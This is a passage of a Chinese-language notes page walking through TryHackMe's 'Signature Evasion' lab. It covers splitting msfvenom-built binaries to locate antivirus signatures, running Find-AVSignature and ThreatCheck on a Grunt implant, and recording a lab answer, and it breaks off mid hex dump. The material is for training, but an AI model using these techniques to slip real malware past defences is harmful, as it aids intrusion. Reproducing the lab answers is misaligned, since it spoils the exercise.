<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-tryhackme/red-teaming/host-evasions/Signature Evasion - 签名规避" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Signature Evasion - 签名规避 | PgDn&#x27;s Notes</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://pgup-code.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://pgup-code.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://pgup-code.github.io/docs/tryhackme/red-teaming/host-evasions/Signature Evasion - 签名规避"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Signature Evasion - 签名规避 | PgDn&#x27;s Notes"><meta data-rh="true" name="description" content="学习如何突破签名并规避常见的杀毒软件，使用现代工具无关的方法。"><meta data-rh="true" property="og:description" content="学习如何突破签名并规避常见的杀毒软件，使用现代工具无关的方法。"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://pgup-code.github.io/docs/tryhackme/red-teaming/host-evasions/Signature Evasion - 签名规避"><link data-rh="true" rel="alternate" href="https://pgup-code.github.io/docs/tryhackme/red-teaming/host-evasions/Signature Evasion - 签名规避" hreflang="en"><link data-rh="true" rel="alternate" href="https://pgup-code.github.io/docs/tryhackme/red-teaming/host-evasions/Signature Evasion - 签名规避" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="PgDn&#39;s Notes RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="PgDn&#39;s Notes Atom Feed"><link rel="stylesheet" href="/assets/css/styles.ebd0f903.css">
<script src="/assets/js/runtime~main.e19854ae.js" defer="defer"></script>
<script src="/assets/js/main.94a3b921.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="My Note Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="My Note Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">PgDn Notes</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/category/red-teaming---红队">TryHackMe</a><a class="navbar__item navbar__link" href="/docs/category/docusaurus-备忘录">备忘录</a><a class="navbar__item navbar__link" href="/blog">博客</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/PgUp-code/PgUp-code.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/category/red-teaming---红队">Red Teaming - 红队</a><button aria-label="Collapse sidebar category &#x27;Red Teaming - 红队&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/category/host-evasions---主机规避">Host Evasions - 主机规避</a><button aria-label="Collapse sidebar category &#x27;Host Evasions - 主机规避&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Windows Internals - Windows 内部原理">Windows Internals - Windows 内部原理</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Introduction to Windows API - Windows API简介">Introduction to Windows API - Windows API简介</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Abusing Windows Internals - 滥用 Windows 内部机制">Abusing Windows Internals - 滥用 Windows 内部机制</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Introduction to Antivirus - 防病毒简介">Introduction to Antivirus - 防病毒简介</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/AV Evasion Shellcode - AV 绕过：Shellcode">AV Evasion Shellcode - AV 绕过：Shellcode</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Obfuscation Principles - 混淆原则">Obfuscation Principles - 混淆原则</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Signature Evasion - 签名规避">Signature Evasion - 签名规避</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Bypassing UAC - 绕过 UAC">Bypassing UAC - 绕过 UAC</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Runtime Detection Evasion - 运行时检测规避">Runtime Detection Evasion - 运行时检测规避</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Evading Logging and Monitoring - 绕过日志记录和监控">Evading Logging and Monitoring - 绕过日志记录和监控</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Living Off the Land - 利用现成工具">Living Off the Land - 利用现成工具</a></li></ul></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/category/red-teaming---红队"><span itemprop="name">Red Teaming - 红队</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/category/host-evasions---主机规避"><span itemprop="name">Host Evasions - 主机规避</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Signature Evasion - 签名规避</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Signature Evasion - 签名规避</h1></header><blockquote>
<p>学习如何突破签名并规避常见的杀毒软件，使用现代工具无关的方法。</p>
<p><a href="https://tryhackme.com/room/signatureevasion" target="_blank" rel="noopener noreferrer">TryHackMe | Signature Evasion</a></p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction---简介">Introduction - 简介<a href="#introduction---简介" class="hash-link" aria-label="Direct link to Introduction - 简介" title="Direct link to Introduction - 简介">​</a></h2>
<p>对手在面对先进的杀毒引擎或<strong>EDR</strong>（<strong>终端检测与响应</strong>）解决方案时，可能会在克服特定检测时遇到困难。即使采用了在<a href="https://tryhackme.com/room/obfuscationprinciples" target="_blank" rel="noopener noreferrer">混淆原理</a>中讨论的一些常见混淆或规避技术，恶意文件中的签名仍然可能存在。</p>
<p>为了对抗持续存在的签名，对手可以单独观察每个签名，并根据需要进行处理。</p>
<p>在本课程中，我们将了解什么是签名以及如何找到它们，然后尝试通过工具无关的思维方式突破它们。为了深入了解并对抗启发式签名，我们还将讨论更高级的代码概念和“恶意软件最佳实践”。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="学习目标">学习目标<a href="#学习目标" class="hash-link" aria-label="Direct link to 学习目标" title="Direct link to 学习目标">​</a></h3>
<ol>
<li>了解签名的来源以及如何在恶意代码中观察/检测它们</li>
<li>实施已记录的混淆方法以突破签名</li>
<li>利用非混淆基础的技术突破与功能无关的签名</li>
</ol>
<p>本课程是<a href="https://tryhackme.com/room/obfuscationprinciples" target="_blank" rel="noopener noreferrer">混淆原理</a>的继承者；如果您尚未完成该课程，我们强烈建议先完成它。</p>
<p>在开始本课程之前，请熟悉基本的编程逻辑和语法。推荐了解 C 和 PowerShell，但不是必需的。</p>
<p>我们提供了一个基础的 Windows 机器，内含完成本课程所需的文件。您可以通过浏览器或使用以下凭据通过 RDP 访问该机器。</p>
<p>机器 IP: <code>10.10.236.58</code>       用户名: <code>Student</code>       密码: <code>TryHackMe!</code></p>
<p>这将涉及大量信息，请准备好您的锤子和灭火器。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="signature-identification---签名识别">Signature Identification - 签名识别<a href="#signature-identification---签名识别" class="hash-link" aria-label="Direct link to Signature Identification - 签名识别" title="Direct link to Signature Identification - 签名识别">​</a></h2>
<p>在开始突破签名之前，我们需要了解并识别我们要寻找的内容。正如在<a href="https://tryhackme.com/room/introtoav" target="_blank" rel="noopener noreferrer">反病毒介绍</a>中所述，签名被反病毒引擎用来追踪和识别可能可疑和/或恶意的程序。在这个任务中，我们将观察如何手动识别签名开始的精确字节。</p>
<p>在识别签名时，无论是手动还是自动化，我们都必须采用迭代过程来确定签名开始的字节位置。通过递归地将已编译的二进制文件分割成两半并进行测试，我们可以大致估算出需要进一步调查的字节范围。</p>
<p>我们可以使用原生工具 <code>head</code>、<code>dd</code> 或 <code>split</code> 来分割已编译的二进制文件。在以下的命令提示符中，我们将演示如何使用 <code>head</code> 查找 msfvenom 二进制文件中存在的第一个签名。</p>
<p>一旦分割，将二进制文件从开发环境移动到您希望测试的带有反病毒引擎的机器上。如果出现警报，则进入二进制文件的下半部分并再次进行分割。如果没有警报，则进入上半部分并再次分割。继续这个模式，直到无法确定下一步的位置；通常，这会发生在千字节范围内。</p>
<p>一旦到达无法准确分割二进制文件的位置，您可以使用十六进制编辑器查看二进制文件的末尾，查找签名所在的位置。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">0000C2E0  43 68 6E E9 0A 00 00 00 0C 4D 1A 8E 04 3A E9 89  Chné.....M.Ž.:é‰</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0000C2F0  67 6F BE 46 01 00 00 6A 40 90 68 00 10 00 00 E9  go¾F...j@.h....é</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0000C300  0A 00 00 00 53 DF A1 7F 64 ED 40 73 4A 64 56 90  ....Sß¡.dí@sJdV.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0000C310  6A 00 68 58 A4 53 E5 E9 08 00 00 00 15 0D 69 B6  j.hX¤Såé......i¶</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0000C320  F4 AB 1B 73 FF D5 E9 0A 00 00 00 7D 43 00 40 DB  ô«.sÿÕé....}C.@Û</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0000C330  43 8B AC 55 82 89 C3 90 E9 08 00 00 00 E4 95 8E  C‹¬U‚‰Ã.é....ä•Ž</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0000C340  2C 06 AC 29 A3 89 C7 90 E9 0B 00 00 00 0B 32 AC  ,.¬)£‰Ç.é.....2¬</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>我们已经找到了签名的位置；其人类可读性将取决于工具本身和编译方法。</p>
<p>现在…没有人愿意花费数小时反复追踪坏字节；让我们自动化这个过程！在接下来的任务中，我们将介绍一些<strong>FOSS</strong>（<strong>免费和开源软件</strong>）解决方案，帮助我们在编译后的代码中识别签名。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>根据本任务中获得的知识，使用本任务中讨论的原生工具分割位于 <code>C:\Users\Student\Desktop\Binaries\shell.exe</code> 中的二进制文件。递归地确定分割后的二进制文件是否被检测到，直到您获得最接近签名的千字节位置。</p><p>最接近千字节的第一个检测到的字节是什么？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">51000</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="automating-signature-identification---自动化签名识别">Automating Signature Identification - 自动化签名识别<a href="#automating-signature-identification---自动化签名识别" class="hash-link" aria-label="Direct link to Automating Signature Identification - 自动化签名识别" title="Direct link to Automating Signature Identification - 自动化签名识别">​</a></h2>
<p>在前一个任务中展示的过程可能相当繁琐。为了加快速度，我们可以使用脚本自动化该过程，通过设定间隔来分割字节。<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/AntivirusBypass/Find-AVSignature.ps1" target="_blank" rel="noopener noreferrer">Find-AVSignature</a> 将会在给定的间隔内分割提供的字节范围。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\&gt; . .\FInd-AVSignature.ps1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\&gt; Find-AVSignature</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmdlet Find-AVSignature at command pipeline position 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Supply values for the following parameters:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">StartByte: 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EndByte: max</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Interval: 1000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Do you want to continue?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">This script will result in 1 binaries being written to &quot;C:\Users\TryHackMe&quot;!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[Y] Yes  [N] No  [S] Suspend  [?] Help (default is &quot;Y&quot;): y</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这个脚本减轻了很多手动工作，但仍然有一些局限性。尽管它比前一个任务需要的交互少，但仍然需要设置适当的间隔才能正常工作。此脚本还仅在将二进制文件写入磁盘后观察其中的字符串，而不是利用反病毒引擎的全部功能进行扫描。</p>
<p>为了解决这个问题，我们可以使用其他<strong>FOSS</strong>（<strong>免费和开源软件</strong>）工具，它们利用反病毒引擎本身来扫描文件，包括<a href="https://github.com/matterpreter/DefenderCheck" target="_blank" rel="noopener noreferrer">DefenderCheck</a>、<a href="https://github.com/rasta-mouse/ThreatCheck" target="_blank" rel="noopener noreferrer">ThreatCheck</a>和<a href="https://github.com/RythmStick/AMSITrigger" target="_blank" rel="noopener noreferrer">AMSITrigger</a>。在这个任务中，我们将主要关注ThreatCheck，并在最后简要提及AMSITrigger的使用。</p>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="threatcheck">ThreatCheck<a href="#threatcheck" class="hash-link" aria-label="Direct link to ThreatCheck" title="Direct link to ThreatCheck">​</a></h3>
<p>ThreatCheck是DefenderCheck的一个分支，并且可以说是三者中最广泛使用/最可靠的。为了识别可能的签名，ThreatCheck利用多个反病毒引擎扫描分割后的已编译二进制文件，并报告它认为存在恶意字节的位置。</p>
<p>ThreatCheck并未提供预编译的公开版本。为了方便使用，我们已经为您编译了该工具；它可以在附带的机器中的<code>C:\Users\Administrator\Desktop\Tools</code>目录找到。</p>
<p>以下是ThreatCheck的基本语法用法。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\&gt;ThreatCheck.exe --help</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  -e, --engine    (Default: Defender) Scanning engine. Options: Defender, AMSI</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  -f, --file      Analyze a file on disk</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  -u, --url       Analyze a file from a URL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  --help          Display this help screen.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  --version       Display version information.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>对于我们的用途，我们只需要提供一个文件，并可选择性地提供一个引擎；然而，当处理<strong>AMSI</strong>（<strong>A</strong>nti-<strong>M</strong>alware <strong>S</strong>can <strong>I</strong>nterface）时，我们主要希望使用AMSITrigger，正如我们将在本任务后续讨论的那样。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\&gt;ThreatCheck.exe -f Downloads\Grunt.bin -e AMSI</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	[+] Target file size: 31744 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	[+] Analyzing...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	[!] Identified end of bad bytes at offset 0x6D7A</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	00000000   65 00 22 00 3A 00 22 00  7B 00 32 00 7D 00 22 00   e·&quot;·:·&quot;·{·2·}·&quot;·</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	00000010   2C 00 22 00 74 00 6F 00  6B 00 65 00 6E 00 22 00   ,·&quot;·t·o·k·e·n·&quot;·</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	00000020   3A 00 7B 00 33 00 7D 00  7D 00 7D 00 00 43 7B 00   :·{·3·}·}·}··C{·</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	00000030   7B 00 22 00 73 00 74 00  61 00 74 00 75 00 73 00   {·&quot;·s·t·a·t·u·s·</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	00000040   22 00 3A 00 22 00 7B 00  30 00 7D 00 22 00 2C 00   &quot;·:·&quot;·{·0·}·&quot;·,·</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	00000050   22 00 6F 00 75 00 74 00  70 00 75 00 74 00 22 00   &quot;·o·u·t·p·u·t·&quot;·</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	00000060   3A 00 22 00 7B 00 31 00  7D 00 22 00 7D 00 7D 00   :·&quot;·{·1·}·&quot;·}·}·</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	00000070   00 80 B3 7B 00 7B 00 22  00 47 00 55 00 49 00 44   ·?³{·{·&quot;·G·U·I·D</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	00000080   00 22 00 3A 00 22 00 7B  00 30 00 7D 00 22 00 2C   ·&quot;·:·&quot;·{·0·}·&quot;·,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	00000090   00 22 00 54 00 79 00 70  00 65 00 22 00 3A 00 7B   ·&quot;·T·y·p·e·&quot;·:·{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	000000A0   00 31 00 7D 00 2C 00 22  00 4D 00 65 00 